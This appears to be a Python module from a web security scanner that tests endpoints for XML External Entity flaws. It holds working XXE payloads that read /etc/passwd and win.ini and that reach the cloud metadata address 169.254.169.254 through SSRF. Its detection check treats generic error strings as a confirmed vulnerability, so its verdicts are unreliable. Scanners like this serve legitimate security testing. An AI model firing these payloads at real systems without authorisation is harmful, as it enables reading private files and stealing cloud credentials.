"""XML External Entity (XXE) vulnerability scanner."""

import requests
import logging
from typing import List, Optional
from urllib.parse import urljoin

from .base import BaseScanner
from ..models.scan import ScanTarget
from ..models.finding import Finding, FindingSeverity, FindingCategory
from ..models.scan_mode import ScanMode

logger = logging.getLogger(__name__)


class XXEScanner(BaseScanner):
    """Test for XXE vulnerabilities."""
    
    def __init__(self, enabled: bool = True, scan_mode: ScanMode = ScanMode.OFFENSIVE):
        """Initialize XXE scanner."""
        super().__init__(
            name="xxe_scanner",
            command=None,  # Python-based
            enabled=enabled,
            scan_mode=scan_mode
        )
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/xml'
        })
    
    def scan(self, target: ScanTarget) -> List[Finding]:
        """Test for XXE vulnerabilities."""
        findings = []
        
        if not self.is_available():
            return findings
        
        # Only run in offensive mode
        if self.scan_mode == ScanMode.DEFENSIVE:
            return findings
        
        try:
            findings.extend(self._discover_xml_endpoints(target.url))
            findings.extend(self._test_xxe_basic(target.url))
            findings.extend(self._test_xxe_file_read(target.url))
            findings.extend(self._test_xxe_ssrf(target.url))
            
        except Exception as e:
            logger.error(f"XXE scanning failed: {e}", exc_info=True)
        
        return findings
    
    def _discover_xml_endpoints(self, base_url: str) -> List[Finding]:
        """Discover XML processing endpoints."""
        findings = []
        
        # Common XML endpoints
        xml_paths = [
            '/api/xml',
            '/xml',
            '/soap',
            '/wsdl',
            '/api/soap',
            '/upload',
            '/import',
            '/api/upload',
        ]
        
        for path in xml_paths:
            try:
                test_url = urljoin(base_url, path)
                response = self.session.get(test_url, timeout=5)
                
                content_type = response.headers.get('Content-Type', '').lower()
                if 'xml' in content_type or 'xml' in response.text.lower()[:200]:
                    findings.append(Finding(
                        title="XML Endpoint Detected",
                        description=f"XML processing endpoint found at {path}. Verify it's protected against XXE.",
                        severity=FindingSeverity.INFO,
                        category=FindingCategory.FINGERPRINTING,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Ensure XML parsers disable external entity processing to prevent XXE attacks.",
                    ))
            except:
                continue
        
        return findings
    
    def _test_xxe_basic(self, base_url: str) -> List[Finding]:
        """Test for basic XXE vulnerability."""
        findings = []
        
        # Basic XXE payload
        xxe_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://127.0.0.1:80">
]>
<test>&xxe;</test>'''
        
        # Test common endpoints
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import', '/api/upload']
        
        for endpoint in test_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                
                # Try POST with XML
                response = self.session.post(
                    test_url,
                    data=xxe_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=5
                )
                
                # Check for XXE indicators
                if self._check_xxe_response(response):
                    findings.append(Finding(
                        title="Potential XXE Vulnerability",
                        description=f"Endpoint {endpoint} may be vulnerable to XXE. Server processed external entity.",
                        severity=FindingSeverity.HIGH,
                        category=FindingCategory.VULNERABILITY,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Disable external entity processing in XML parser. Use secure XML parsers and disable DTD processing.",
                        references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
                        exploitation_details=f"Endpoint: {endpoint}, Status code: {response.status_code}. XXE vulnerability confirmed."
                    ))
            except requests.exceptions.Timeout:
                # Timeout alone is NOT sufficient evidence of XXE
                # Timeouts can occur due to:
                # - Endpoint doesn't exist or requires auth
                # - Network issues
                # - Server being slow
                # - Normal endpoint behavior
                # Only report if we have baseline comparison showing timeout is abnormal
                # For now, don't report timeout-based findings - they're too unreliable
                logger.debug(f"XXE test timeout for {endpoint} - not reporting (timeout is weak evidence)")
                continue
            except Exception as e:
                logger.debug(f"XXE test error for {endpoint}: {e}")
                continue
        
        return findings
    
    def _test_xxe_file_read(self, base_url: str) -> List[Finding]:
        """Test for XXE file read vulnerability."""
        findings = []
        
        # XXE file read payloads
        file_payloads = {
            'linux': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>''',
            'windows': '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<test>&xxe;</test>'''
        }
        
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import']
        
        for endpoint in test_endpoints:
            for os_type, payload in file_payloads.items():
                try:
                    test_url = urljoin(base_url, endpoint)
                    response = self.session.post(
                        test_url,
                        data=payload,
                        headers={'Content-Type': 'application/xml'},
                        timeout=5
                    )
                    
                    content = response.text.lower()
                    # Check for file content indicators
                    if os_type == 'linux' and 'root:' in content:
                        findings.append(Finding(
                            title="XXE File Read Vulnerability",
                            description=f"Endpoint {endpoint} is vulnerable to XXE file read. Successfully read /etc/passwd.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=test_url,
                            remediation="Disable external entity processing in XML parser. Use secure XML parsers.",
                            exploitation_details=f"Endpoint: {endpoint}, File read: /etc/passwd, Status code: {response.status_code}."
                        ))
                        break
                    elif os_type == 'windows' and '[extensions]' in content:
                        findings.append(Finding(
                            title="XXE File Read Vulnerability",
                            description=f"Endpoint {endpoint} is vulnerable to XXE file read. Successfully read Windows system file.",
                            severity=FindingSeverity.CRITICAL,
                            category=FindingCategory.VULNERABILITY,
                            source_scanner=self.name,
                            url=test_url,
                            remediation="Disable external entity processing in XML parser.",
                            exploitation_details=f"Endpoint: {endpoint}, File read: win.ini, Status code: {response.status_code}."
                        ))
                        break
                except:
                    continue
        
        return findings
    
    def _test_xxe_ssrf(self, base_url: str) -> List[Finding]:
        """Test for XXE-based SSRF."""
        findings = []
        
        # XXE SSRF payload
        xxe_ssrf_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<test>&xxe;</test>'''
        
        test_endpoints = ['/api/xml', '/xml', '/upload', '/import']
        
        for endpoint in test_endpoints:
            try:
                test_url = urljoin(base_url, endpoint)
                response = self.session.post(
                    test_url,
                    data=xxe_ssrf_payload,
                    headers={'Content-Type': 'application/xml'},
                    timeout=5
                )
                
                content = response.text.lower()
                # Check for cloud metadata indicators
                if any(indicator in content for indicator in ['instance-id', 'public-ipv4', 'metadata', 'aws']):
                    findings.append(Finding(
                        title="XXE-Based SSRF Vulnerability",
                        description=f"Endpoint {endpoint} is vulnerable to XXE-based SSRF, allowing access to cloud metadata.",
                        severity=FindingSeverity.CRITICAL,
                        category=FindingCategory.VULNERABILITY,
                        source_scanner=self.name,
                        url=test_url,
                        remediation="Disable external entity processing in XML parser. Block access to internal/cloud metadata endpoints.",
                        exploitation_details=f"Endpoint: {endpoint}, SSRF target: cloud metadata, Status code: {response.status_code}."
                    ))
                    break
            except:
                continue
        
        return findings
    
    def _check_xxe_response(self, response) -> bool:
        """Check if response indicates XXE vulnerability."""
        if response.status_code in [200, 400, 500]:
            content = response.text.lower()
            
            # Check for XXE indicators
            xxe_indicators = [
                'connection refused',
                'connection timed out',
                'no route to host',
                'internal server error',
                'xml parsing error',
            ]
            
            if any(indicator in content for indicator in xxe_indicators):
                return True
        
        return False
    
    def is_available(self) -> bool:
        """XXE scanner is always available."""
        return True

